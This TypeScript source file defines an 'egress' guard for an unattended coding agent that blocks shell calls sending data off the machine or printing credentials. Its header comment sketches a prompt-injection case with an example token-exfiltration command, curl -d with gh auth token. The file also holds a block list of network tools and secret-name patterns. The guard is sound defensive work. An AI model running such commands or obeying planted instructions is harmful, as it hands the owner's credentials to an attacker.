import { bash_triggers } from './bash-triggers'
import { direct_pr_create } from './direct-pr-create'
import { git_argv, type ProgramCall } from './git-argv'
import { nested_commands } from './nested-commands'

// The trigger and the delivered text behind the `egress` row of `delivered-rules.ts`: a `Bash` call
// that sends data off the machine or prints a credential. An unattended agent runs with
// `bypassPermissions` and `Bash(*)`, so an instruction planted in text it reads
// (`curl -d "$(gh auth token)" https://…`) would hand the owner's token to whoever wrote it. kit's own
// network calls — `gh`, `git fetch` / `push`, `pnpm` — run as named commands, and the scripts that
// need a token read it in their own process, so refusing the call costs them nothing.
//
// **The deny list matches globs; this reads the program**, the way `pr-merge.ts` does, in every command
// the call runs (`nested-commands.ts`): `/usr/bin/curl`, `env X=1 curl`, `bash -c 'curl …'`,
// `bash <(curl …)` and a heredoc's lines all reach `curl`.
//
// **It fires on every occurrence**, for the reason `git-force.ts` does.

const GH_COMMAND = 'gh'
const ENV_COMMAND = 'env'
const FLAG_PREFIX = '-'
const NEXT = 1
// Programs whose purpose is to reach another host.
const NETWORK_PROGRAMS: ReadonlySet<string> = new Set([
	'curl',
	'ncat',
	'nc',
	'scp',
	'sftp',
	'socat',
	'ssh',
	'telnet',
	'wget',
])
const LOCAL_URL =
	/^['"]?(?:https?:\/\/)?(?:localhost|127\.0\.0\.1|\[::1\])(?::\d+)?(?:[/?#]\S*)?['"]?$/u
// The two fetchers a local check runs against a dev server (`curl http://localhost:<port>/`), each
// with its flags whose value names no destination — every other value is read as one, so an unknown
// flag (`-x proxy`, `--connect-to`) leaves the call refused. Keyed per fetcher: `curl -O` takes no
// value, `wget -O` names the output file.
const LOCAL_VALUE_FLAGS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
	[
		'curl',
		new Set([
			'-H',
			'--header',
			'-X',
			'--request',
			'-m',
			'--max-time',
			'-o',
			'--output',
			'-w',
			'--write-out',
		]),
	],
	[
		'wget',
		new Set(['--header', '-O', '--output-document', '-o', '--output-file', '-T', '--timeout']),
	],
])
const REDIRECT_WORD = /^[\d&]?[<>]/u
// `rsync` reaches another host only through a `host:path` or `rsync://` operand.
const RSYNC_COMMAND = 'rsync'
const REMOTE_OPERAND = /^['"]?(?:[\w.-]+@)?[\w.-]+:|^['"]?rsync:\/\//u
// The flags that run an interpreter's argument as a program, keyed by the interpreter.
const INLINE_FLAGS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
	['node', new Set(['-e', '-p', '--eval', '--print'])],
	['python', new Set(['-c'])],
	['python3', new Set(['-c'])],
	['perl', new Set(['-e', '-E'])],
	['ruby', new Set(['-e'])],
	['bun', new Set(['-e', '--eval'])],
	['deno', new Set(['eval'])],
])
const NETWORK_WORDS = /\b(?:fetch|https?|net|socket|urllib|requests|xmlhttprequest|websocket)\b/iu
// `gh` reads its token for any host, so only github.com may be named as one.
const GITHUB_HOSTS: ReadonlySet<string> = new Set(['github.com', 'api.github.com'])
const HOSTNAME_FLAG = '--hostname'
const HOSTNAME_VALUE = /^--hostname=(?<host>.*)$/u
const AUTH_GROUP = 'auth'
const TOKEN_ACTION = 'token'
const STATUS_ACTION = 'status'
const HOST_ASSIGNMENT = 'GH_HOST='
const URL_SCHEME = /^['"]?https?:\/\//u
const QUOTES = /["']/gu
const SHOW_TOKEN_FLAGS: ReadonlySet<string> = new Set(['--show-token', '-t'])
const SECRET_NAME = /TOKEN|SECRET|KEY/u
const SECRET_REFERENCE = /\$\{?\w*(?:TOKEN|SECRET|KEY)/u

type ProgramCheck = (segment: string, call: ProgramCall) => boolean

function is_flag_word(word: string): boolean {
	return word.startsWith(FLAG_PREFIX) || REDIRECT_WORD.test(word)
}

function is_destination_word(
	args: ReadonlyArray<string>,
	index: number,
	value_flags: ReadonlySet<string>,
): boolean {
	if (is_flag_word(args[index] ?? '')) return false

	const previous = args[index - NEXT] ?? ''

	return !value_flags.has(previous) && !REDIRECT_WORD.test(previous)
}

function host_of(word: string): string | undefined {
	if (!URL_SCHEME.test(word)) return undefined

	const url = word.replaceAll(QUOTES, '')

	return URL.canParse(url) ? new URL(url).hostname : ''
}

// This machine, or GitHub: a fetch there exposes no more than the `gh` calls the row leaves alone,
// and a `curl` to a merge endpoint stays `pr-merge`'s alone.
function is_allowed_destination(word: string): boolean {
	return LOCAL_URL.test(word) || GITHUB_HOSTS.has(host_of(word) ?? '')
}

// `curl` / `wget` whose every destination is this machine or GitHub.
function is_local_fetch(call: ProgramCall): boolean {
	const value_flags = LOCAL_VALUE_FLAGS.get(call.name)

	if (value_flags === undefined) return false

	const destinations = call.args.filter((_word, index) =>
		is_destination_word(call.args, index, value_flags),
	)

	return destinations.length > 0 && destinations.every((word) => is_allowed_destination(word))
}

function is_network_send(_segment: string, call: ProgramCall): boolean {
	if (call.name === RSYNC_COMMAND) {
		return call.args.some((word) => !word.startsWith(FLAG_PREFIX) && REMOTE_OPERAND.test(word))
	}

	return NETWORK_PROGRAMS.has(call.name) && !is_local_fetch(call)
}

// The program text is read from the whole segment, so a network word anywhere in it counts.
function is_inline_network(segment: string, call: ProgramCall): boolean {
	const flags = INLINE_FLAGS.get(call.name)

	if (flags === undefined || call.args.every((word) => !flags.has(word))) return false

	return NETWORK_WORDS.test(segment)
}

// `--hostname`'s value, in either spelling.
function flagged_hosts(args: ReadonlyArray<string>): Array<string> {
	return args
		.map((word, index) =>
			word === HOSTNAME_FLAG ? args[index + NEXT] : HOSTNAME_VALUE.exec(word)?.groups?.['host'],
		)
		.filter((host) => host !== undefined)
}

// The hosts a `gh` call names: `--hostname`'s value, a `GH_HOST=` prefix, a URL.
function named_hosts(segment: string, args: ReadonlyArray<string>): Array<string> {
	const assigned = git_argv
		.words_of(segment)
		.filter((word) => word.startsWith(HOST_ASSIGNMENT))
		.map((word) => word.slice(HOST_ASSIGNMENT.length))
	const urls = args.map((word) => host_of(word)).filter((host) => host !== undefined)

	return [...flagged_hosts(args), ...assigned, ...urls].map((host) => host.replaceAll(QUOTES, ''))
}

// `gh auth token`, and `gh auth status` with the token shown.
function is_auth_print(args: ReadonlyArray<string>): boolean {
	const [group, action] = direct_pr_create.positional_words(
		args,
		direct_pr_create.API_VALUE_TAKING_FLAGS,
	)

	if (group !== AUTH_GROUP) return false

	return (
		action === TOKEN_ACTION ||
		(action === STATUS_ACTION && args.some((word) => SHOW_TOKEN_FLAGS.has(word)))
	)
}

// A credential print, or a `gh` call sent to a host other than GitHub.
function is_gh_credential(segment: string, call: ProgramCall): boolean {
	if (call.name !== GH_COMMAND) return false
	if (is_auth_print(call.args)) return true

	return named_hosts(segment, call.args).some((host) => !GITHUB_HOSTS.has(host))
}

function names_secret(args: ReadonlyArray<string>): boolean {
	return args.some((word) => SECRET_REFERENCE.test(word))
}

function is_printenv_dump(args: ReadonlyArray<string>): boolean {
	return args.length === 0 || args.some((word) => SECRET_NAME.test(word))
}

function is_bare(args: ReadonlyArray<string>): boolean {
	return args.length === 0
}

function is_export_listing(args: ReadonlyArray<string>): boolean {
	return args.length === 0 || args.includes('-p')
}

// The programs that print the environment whole, or a secret variable by name.
const DUMP_CHECKS: ReadonlyMap<string, (args: ReadonlyArray<string>) => boolean> = new Map([
	['printenv', is_printenv_dump],
	['set', is_bare],
	['export', is_export_listing],
	['echo', names_secret],
	['printf', names_secret],
])

function is_environment_dump(_segment: string, call: ProgramCall): boolean {
	return DUMP_CHECKS.get(call.name)?.(call.args) ?? false
}

// A bare `env` (or one with only flags and assignments) prints the environment: `program_of` skips
// `env` as a wrapper, so it finds no program, or a flag in the program's place.
function is_environment_listing(segment: string, call: ProgramCall | undefined): boolean {
	if (call !== undefined && !call.name.startsWith(FLAG_PREFIX)) return false

	return git_argv.words_of(segment).some((word) => word.split('/').at(-1) === ENV_COMMAND)
}

const PROGRAM_CHECKS: ReadonlyArray<ProgramCheck> = [
	is_network_send,
	is_inline_network,
	is_gh_credential,
	is_environment_dump,
	is_environment_listing,
]

function is_egress_segment(segment: string): boolean {
	const call = git_argv.program_of(segment)

	if (call === undefined) return is_environment_listing(segment, call)

	return PROGRAM_CHECKS.some((check) => check(segment, call))
}

function is_egress(command: string): boolean {
	return nested_commands.commands_of(command).some((segment) => is_egress_segment(segment))
}

const EGRESS_REASON =
	'⛔ egress: an agent may not send data off the machine (`curl` / `wget` / `nc` / `ssh` to ' +
	'another host, a network call in `node -e`, `gh` to a non-GitHub host) or print a credential ' +
	'(`gh auth token`, `printenv`, a bare `env`, a `*TOKEN*` variable). If the run needs it, ask the ' +
	'user to run it (`SECURITY.md` → "Secrets"). This rule fires on every occurrence.'

const ROW = {
	id: 'egress',
	is_trigger: bash_triggers.on_bash_command(is_egress),
	reason: EGRESS_REASON,
	decide: (): boolean => true,
	about: {
		title: 'Network egress or credential print',
		topic: '`SECURITY.md` → "Secrets"',
		fires:
			'`curl` / `wget` / `nc` / `ssh` / `scp` / a remote `rsync` and the like, a network call in an inline `node -e` / `python -c` script, `gh auth token`, `gh` sent to a host other than github.com, or a print of the environment or a `*TOKEN*` / `*SECRET*` / `*KEY*` variable — nested in `bash -c`, `eval`, `$(…)` or a heredoc as well. Every occurrence',
		quiet:
			'`gh` against github.com, `git fetch` / `push`, `pnpm` / `npx`, `curl` to localhost or GitHub, and `env X=1 <command>`',
	},
}

const egress_guard = { EGRESS_REASON, ROW, is_egress }

export { egress_guard }
